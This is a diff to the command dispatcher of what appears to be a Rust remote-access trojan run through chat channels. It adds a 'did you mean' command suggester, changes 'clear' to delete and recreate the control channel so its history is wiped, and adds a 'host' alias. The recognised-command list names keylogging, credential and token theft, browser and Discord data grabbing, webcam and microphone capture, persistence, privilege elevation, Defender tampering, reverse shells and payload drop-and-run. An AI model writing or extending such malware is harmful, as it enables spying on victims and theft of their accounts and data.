@@ -63,6 +63,52 @@ fn stamp() -> String {
     chrono::Local::now().format("%Y%m%d-%H%M%S").to_string()
 }
 
+/// Every command name we recognise (used for "did you mean").
+const COMMANDS: &[&str] = &[
+    "help", "ping", "id", "whoami", "info", "sysinfo", "shell", "cmd", "sh", "exec", "start",
+    "ps", "kill", "screenshot", "ss", "mic", "freeze", "unfreeze", "keylog", "clipboard", "clip",
+    "ls", "dir", "getfile", "grab", "putfile", "receive", "download", "persist", "unpersist",
+    "msg", "popup", "monitor", "wifi", "wallpaper", "speak", "reboot", "shutdown", "bsod",
+    "volume", "webcam", "cam", "browsers", "creds", "powershell", "pwsh", "discord", "tokens",
+    "zip", "dropexec", "toast", "clear", "uac", "elevate", "net", "connections", "portscan",
+    "revshell", "proxy", "audio", "open", "defender", "host", "hosts", "lock", "update",
+    "uninstall", "cleanup", "remove", "exit", "quit",
+];
+
+fn levenshtein(a: &str, b: &str) -> usize {
+    let a: Vec<char> = a.chars().collect();
+    let b: Vec<char> = b.chars().collect();
+    let mut prev: Vec<usize> = (0..=b.len()).collect();
+    let mut cur = vec![0usize; b.len() + 1];
+    for i in 1..=a.len() {
+        cur[0] = i;
+        for j in 1..=b.len() {
+            let cost = if a[i - 1] == b[j - 1] { 0 } else { 1 };
+            cur[j] = (prev[j] + 1).min(cur[j - 1] + 1).min(prev[j - 1] + cost);
+        }
+        std::mem::swap(&mut prev, &mut cur);
+    }
+    prev[b.len()]
+}
+
+/// Nearest known command within edit distance 2, or a prefix relationship.
+fn suggest(cmd: &str) -> Option<&'static str> {
+    let mut best: Option<(&'static str, usize)> = None;
+    for c in COMMANDS {
+        let d = levenshtein(cmd, c);
+        if best.map(|(_, bd)| d < bd).unwrap_or(true) {
+            best = Some((c, d));
+        }
+    }
+    best.and_then(|(c, d)| {
+        if d <= 2 || c.starts_with(cmd) || cmd.starts_with(c) {
+            Some(c)
+        } else {
+            None
+        }
+    })
+}
+
 pub async fn dispatch(
     st: &Stoat,
     cfg: &Config,
@@ -392,14 +438,41 @@ pub async fn dispatch(
             st.send(console, "toast shown").await?;
         }
         "clear" => {
-            let (target, label) = match arg.trim().to_ascii_lowercase().as_str() {
+            let which = arg.trim().to_ascii_lowercase();
+            let (target, label) = match which.as_str() {
                 "info" | "information" => (infoch.to_string(), "information"),
                 "files" => (files.to_string(), "files"),
                 _ => (console.to_string(), "console"),
             };
-            let n = st.purge_channel(&target).await.unwrap_or(0);
-            st.send(console, &format!("cleared {n} message(s) in #{label}"))
-                .await?;
+            if target.is_empty() {
+                st.send(console, "no workspace yet").await?;
+            } else {
+                match st.delete_channel(&target).await {
+                    Ok(()) => {
+                        // Recreate it (and refresh our workspace) via the normal ensure path.
+                        let mut new_console = console.to_string();
+                        if let Some(control) = &cfg.channel {
+                            if let Ok(nw) = crate::workspace::ensure(st, control).await {
+                                new_console = nw.channels.console.clone();
+                                *crate::AGENT_WS.lock().unwrap() = Some(nw);
+                            }
+                        }
+                        st.send(
+                            &new_console,
+                            &format!("cleared #{label} (deleted + recreated)"),
+                        )
+                        .await?;
+                    }
+                    Err(e) => {
+                        let n = st.purge_channel(&target).await.unwrap_or(0);
+                        st.send(
+                            console,
+                            &format!("delete failed ({e:#}); purged {n} message(s) instead"),
+                        )
+                        .await?;
+                    }
+                }
+            }
         }
         "net" | "connections" => {
             let r = tokio::task::spawn_blocking(host::net_connections).await?;
@@ -464,7 +537,7 @@ pub async fn dispatch(
                 st.send(console, "opened").await?;
             }
         }
-        "hosts" => {
+        "host" | "hosts" => {
             let a = arg.trim();
             if a.is_empty() {
                 let r = tokio::task::spawn_blocking(host::hosts_show).await?;
@@ -586,7 +659,10 @@ pub async fn dispatch(
             std::process::exit(0);
         }
         _ => {
-            st.send(console, &format!("unknown command: {cmd}")).await?;
+            let hint = suggest(&cmd)
+                .map(|s| format!(" — did you mean !{s}?"))
+                .unwrap_or_default();
+            st.send(console, &format!("unknown command: {cmd}{hint}")).await?;
         }
     }
     Ok(())
